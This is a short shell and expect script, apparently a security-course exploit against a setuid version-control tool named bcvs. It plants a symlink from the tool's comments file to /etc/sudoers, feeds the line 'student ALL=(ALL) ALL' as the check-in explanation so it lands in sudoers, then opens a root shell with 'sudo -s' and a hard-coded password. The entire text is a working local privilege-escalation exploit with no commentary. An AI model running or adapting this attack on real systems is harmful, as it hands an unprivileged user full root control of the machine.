cd ~
mkdir test
cd test
mkdir .bcvs
cd .bcvs
touch block.list
ln -s /etc/sudoers anything.txt.comments
cd ..

/usr/bin/expect -c '
cd ~/test
spawn /opt/bcvs/bcvs ci anything.txt
expect "Please write a SHORT explanation:\n"
send "student ALL=(ALL) ALL\n"

spawn sudo -s
expect "[sudo] password for student: "
send "security\r"
'